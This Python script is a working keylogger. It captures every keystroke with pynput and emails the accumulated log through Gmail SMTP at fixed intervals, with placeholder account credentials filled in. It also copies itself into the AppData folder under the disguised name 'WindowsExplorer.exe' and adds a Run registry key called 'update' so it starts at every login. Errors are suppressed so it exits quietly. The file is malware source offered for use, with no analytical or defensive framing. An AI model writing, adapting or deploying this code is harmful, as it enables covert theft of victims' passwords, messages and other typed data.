#!/usr/bin/env python3
from pynput.keyboard import Listener, Key, Controller
import threading, smtplib, sys, subprocess, os, shutil

log = " "
def send_mail(email, password, timer):
    global log
    if (log != " "):
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(email, password)
        body = "Logger\n\n{}".format(str(log))
        server.sendmail(email, email, body)
        server.quit()
    timer = threading.Timer(timer, send_mail, args=[email, password, timer])
    timer.start()
    log = " "

def append_log(key):
    global log
    log = log + key

def on_press(key):
    if hasattr(key, 'char'):
        append_log(key.char)
    elif key == Key.space:
        append_log(' ')
    elif key == Key.enter:
        append_log('\n')
    elif key == Key.tab:
        append_log('\t')
    elif key == Key.shift:
        pass
    else:
        append_log(' [' + key.name + '] ')

def persistance():
    location = os.environ["appdata"] + "\\WindowsExplorer.exe"
    if not os.path.exists(location):
        shutil.copyfile(sys.executable, location)
        subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "' + location + '"',shell=True)
        
def start(email, password, timer):
    with Listener(on_press=on_press) as listener:
        persistance()
        send_mail(email, password, timer)
        listener.join()  # Join the thread to the main thread

try:
    start("YourEmail@gmail.com", "YourPass", 700)
except Exception:
    sys.exit()